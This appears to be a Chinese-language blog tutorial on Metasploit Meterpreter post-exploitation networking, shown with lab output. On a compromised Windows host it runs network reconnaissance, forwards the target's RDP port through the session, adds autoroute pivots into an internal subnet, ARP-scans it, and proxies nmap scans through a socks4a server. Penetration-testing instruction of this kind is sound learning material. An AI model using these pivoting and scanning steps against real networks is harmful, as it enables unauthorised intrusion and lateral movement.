<h2><span id="网络命令">网络命令</span></h2><h3><span id="基本网络命令">基本网络命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:a7</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.130.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::c55f:725f:9e7d:7056</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:16ab</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:8280</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Teredo Tunneling Pseudo-Interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::100:7f:fffe</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:b1</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.22.171</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::b96b:f6e6:3371:444f</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address                    Remote address       State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------                    --------------       -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135                      0.0.0.0:*            LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445                      0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:554                      0.0.0.0:*            LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp    0.0.0.0:5357                     0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:49152                    0.0.0.0:*            LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp    0.0.0.0:49153                    0.0.0.0:*            LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49154                    0.0.0.0:*            LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49171                    0.0.0.0:*            LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp    0.0.0.0:49176                    0.0.0.0:*            LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp    0.0.0.0:49179                    0.0.0.0:*            LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    tcp    192.168.22.171:139               0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    192.168.22.171:58500             192.168.22.170:4444  ESTABLISHED  0     0      2876/vmtoolsd.exe</span><br><span class="line">    tcp    192.168.22.171:58879             192.168.22.170:4444  ESTABLISHED  0     0      1684/shell.exe</span><br><span class="line">    tcp    192.168.130.128:139              0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::135                           :::*                 LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp6   :::445                           :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::554                           :::*                 LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp6   :::3587                          :::*                 LISTEN       0     0      3824/svchost.exe</span><br><span class="line">    tcp6   :::5357                          :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::49152                         :::*                 LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp6   :::49153                         :::*                 LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp6   :::49154                         :::*                 LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp6   :::49171                         :::*                 LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp6   :::49176                         :::*                 LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp6   :::49179                         :::*                 LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    udp    0.0.0.0:123                      0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:500                      0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:4500                     0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:5004                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5005                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5355                     0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:52358                    0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:58751                    0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:62445                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:65389                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    127.0.0.1:1900                   0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:50203                  0.0.0.0:*                         0     0      508/lsass.exe</span><br><span class="line">    udp    127.0.0.1:52360                  0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    127.0.0.1:55889                  0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:64192                  0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    192.168.22.171:137               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:138               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:1900              0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.22.171:55887             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:137              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:138              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:1900             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:55888            0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::123                           :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::500                           :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::3540                          :::*                              0     0      3824/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::4500                          :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::5004                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5005                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5355                          :::*                              0     0      648/svchost.exe</span><br><span class="line">    udp6   :::52359                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::62446                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::65390                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   ::1:1900                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   ::1:55886                        :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:55884  :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:546    :::*                              0     0      772/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:55885  :::*                              0     0      1260/svchost.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    192.168.22.2     00:50:56:f2:7a:67  14</span><br><span class="line">    192.168.22.170   00:0c:29:92:d5:46  14</span><br><span class="line">    192.168.22.254   00:50:56:f5:66:dc  14</span><br><span class="line">    192.168.22.255   ff:ff:ff:ff:ff:ff  14</span><br><span class="line">    192.168.130.129  00:0c:29:74:6d:d0  11</span><br><span class="line">    192.168.130.254  00:50:56:f7:97:52  11</span><br><span class="line">    192.168.130.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  14</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  14</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  14</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  14</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getproxy </span><br><span class="line">Auto-detect     : Yes</span><br><span class="line">Auto config URL : </span><br><span class="line">Proxy URL       : </span><br><span class="line">Proxy Bypass    : </span><br><span class="line">meterpreter &gt; route</span><br><span class="line"></span><br><span class="line">IPv4 network routes</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Subnet           Netmask          Gateway          Metric  Interface</span><br><span class="line">    ------           -------          -------          ------  ---------</span><br><span class="line">    0.0.0.0          0.0.0.0          192.168.22.2     10      14</span><br><span class="line">    127.0.0.0        255.0.0.0        127.0.0.1        306     1</span><br><span class="line">    127.0.0.1        255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    127.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    192.168.22.0     255.255.255.0    192.168.22.171   266     14</span><br><span class="line">    192.168.22.171   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.22.255   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.130.0    255.255.255.0    192.168.130.128  266     11</span><br><span class="line">    192.168.130.128  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    192.168.130.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        127.0.0.1        306     1</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.22.171   266     14</span><br><span class="line">    255.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.22.171   266     14</span><br><span class="line"></span><br><span class="line">No IPv6 routes were found.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h4><span id="portfwd端口转发">portfwd端口转发</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口删除</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :6666 &lt;-&gt; 127.0.0.1:3389</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd delete -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote          Direction</span><br><span class="line">   -----  -----         ------          ---------</span><br><span class="line">   1      0.0.0.0:6666  127.0.0.1:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd flush</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">[*] Successfully flushed 1 rules</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">No port forwards are currently active.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# rdesktop 127.0.0.1:6666</span><br><span class="line">Failed to negotiate protocol, retrying with plain RDP.</span><br><span class="line">WARNING: Remote desktop does not support colour depth 24; falling back to 16</span><br></pre></td></tr></table></figure>
<h4><span id="autoroute添加路由">autoroute添加路由</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 192.168.130.0/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.130.0/255.255.255.0 via 192.168.22.171</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.130.0      255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p>然后可以利用<code>arp_scanner</code>、<code>portscan</code>等进行扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] ARP Scanning 192.168.130.0/24</span><br><span class="line">[+] 	IP: 192.168.130.1 MAC 00:50:56:c0:00:02 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.128 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.129 MAC 00:0c:29:74:6d:d0 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.255 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] 	IP: 192.168.130.254 MAC 00:50:56:f7:97:52 (VMware, Inc.)</span><br></pre></td></tr></table></figure>
<h4><span id="socks4a代理">Socks4a代理</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; set srvhost 127.0.0.1</span><br><span class="line">msf &gt; set srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gedit /etc/proxychains.conf </span><br><span class="line"></span><br><span class="line">socks4 	127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sV 192.168.130.129</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-18 03:19 EST</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Nmap scan report for bogon (192.168.130.129)</span><br><span class="line">Host is up (0.0027s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span 